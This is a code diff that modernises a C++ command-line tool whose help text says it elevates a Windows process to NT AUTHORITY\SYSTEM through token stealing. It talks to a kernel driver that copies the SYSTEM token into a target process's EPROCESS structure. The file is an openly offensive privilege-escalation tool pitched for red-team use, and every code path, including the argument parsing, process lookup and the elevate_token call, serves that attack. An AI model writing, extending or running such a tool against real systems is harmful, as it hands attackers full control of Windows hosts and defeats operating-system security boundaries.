@@ -1,95 +1,92 @@
-#include <cstdio>
-#include <cstdlib>
-#include <cstring>
+#include <print>
 #include <memory>
 #include <string>
+#include <string_view>
 #include "../Memory/DriverInterface/driver_interface.hpp"
 
-static std::wstring to_wide( const char* s )
+static std::wstring to_wide( std::string_view s )
 {
-	std::wstring ws;
-	while( *s ) ws += static_cast< wchar_t >( *s++ );
-	return ws;
+	return { s.begin(), s.end() };
 }
 
-void print_help( const char* prog )
+static void print_help( std::string_view prog )
 {
-	printf( "%s - Elevate a process to NT AUTHORITY\\SYSTEM via token stealing.\n", prog );
-	printf( "\n" );
-	printf( "Description:\n" );
-	printf( "  Copies the SYSTEM token from PsInitialSystemProcess into the target\n" );
-	printf( "  process's EPROCESS Token field, granting it NT AUTHORITY\\SYSTEM\n" );
-	printf( "  privileges. Useful for privilege escalation during red team ops.\n" );
-	printf( "\n" );
-	printf( "Usage:\n" );
-	printf( "  %s --self              Elevate the current process\n", prog );
-	printf( "  %s <process_name>      Elevate by process name\n", prog );
-	printf( "  %s --pid <pid>         Elevate by process ID\n", prog );
-	printf( "  %s --help              Show this help\n", prog );
-	printf( "\n" );
-	printf( "Arguments:\n" );
-	printf( "  --self           Elevate this example process itself\n" );
-	printf( "  process_name     Name of the process to elevate (e.g. cmd.exe)\n" );
-	printf( "  --pid <pid>      Process ID to elevate (decimal)\n" );
-	printf( "\n" );
-	printf( "Examples:\n" );
-	printf( "  %s --self\n", prog );
-	printf( "  %s cmd.exe\n", prog );
-	printf( "  %s --pid 1337\n", prog );
+	std::print( R"({0} - Elevate a process to NT AUTHORITY\SYSTEM via token stealing.
+
+Description:
+  Copies the SYSTEM token from PsInitialSystemProcess into the target
+  process's EPROCESS Token field, granting it NT AUTHORITY\SYSTEM
+  privileges. Useful for privilege escalation during red team ops.
+
+Usage:
+  {0} --self              Elevate the current process
+  {0} <process_name>      Elevate by process name
+  {0} --pid <pid>         Elevate by process ID
+  {0} --help              Show this help
+
+Arguments:
+  --self           Elevate this example process itself
+  process_name     Name of the process to elevate (e.g. cmd.exe)
+  --pid <pid>      Process ID to elevate (decimal)
+
+Examples:
+  {0} --self
+  {0} cmd.exe
+  {0} --pid 1337
+)", prog );
 }
 
 int main( int argc, char* argv[] )
 {
-	if( argc < 2 || strcmp( argv[1], "--help" ) == 0 || strcmp( argv[1], "-h" ) == 0 )
+	if( argc < 2 || std::string_view{ argv[1] } == "--help" || std::string_view{ argv[1] } == "-h" )
 	{
 		print_help( argv[0] );
-		return argc > 1 && ( strcmp( argv[1], "--help" ) == 0 || strcmp( argv[1], "-h" ) == 0 ) ? 0 : 1;
+		return ( argc > 1 && ( std::string_view{ argv[1] } == "--help" || std::string_view{ argv[1] } == "-h" ) ) ? 0 : 1;
 	}
 
+	const auto arg1 = std::string_view{ argv[1] };
 	const auto driver = std::make_unique< driver_interface >();
 
 	if( !driver->is_connected() )
 	{
-		printf( "[!] Could not connect to the driver!\n" );
+		std::println( "[!] Could not connect to the driver!" );
 		return 1;
 	}
 
 	DWORD target_pid = 0;
 
-	if( strcmp( argv[1], "--self" ) == 0 )
+	if( arg1 == "--self" )
 	{
 		target_pid = GetCurrentProcessId();
-		printf( "[+] Elevating self (PID: %u)\n", target_pid );
+		std::println( "[+] Elevating self (PID: {})", target_pid );
 	}
-	else if( strcmp( argv[1], "--pid" ) == 0 )
+	else if( arg1 == "--pid" )
 	{
 		if( argc < 3 )
 		{
-			printf( "[!] --pid requires a process ID argument.\n" );
+			std::println( "[!] --pid requires a process ID argument." );
 			return 1;
 		}
 
-		target_pid = static_cast< DWORD >( strtoul( argv[2], nullptr, 10 ) );
+		target_pid = static_cast< DWORD >( std::stoul( argv[2] ) );
 	}
 	else
 	{
-		const auto name = to_wide( argv[1] );
-
-		if( !driver->attach( name ) )
+		if( !driver->attach( to_wide( arg1 ) ) )
 		{
-			printf( "[!] Could not find process '%s'!\n", argv[1] );
+			std::println( "[!] Could not find process '{}'!", arg1 );
 			return 1;
 		}
 
 		target_pid = driver->get_pid();
-		printf( "[+] Found %s (PID: %u)\n", argv[1], target_pid );
+		std::println( "[+] Found {} (PID: {})", arg1, target_pid );
 	}
 
 	if( driver->elevate_token( target_pid ) )
-		printf( "[+] PID %u elevated to NT AUTHORITY\\SYSTEM!\n", target_pid );
+		std::println( "[+] PID {} elevated to NT AUTHORITY\\SYSTEM!", target_pid );
 	else
 	{
-		printf( "[!] Failed to elevate PID %u.\n", target_pid );
+		std::println( "[!] Failed to elevate PID {}.", target_pid );
 		return 1;
 	}
 
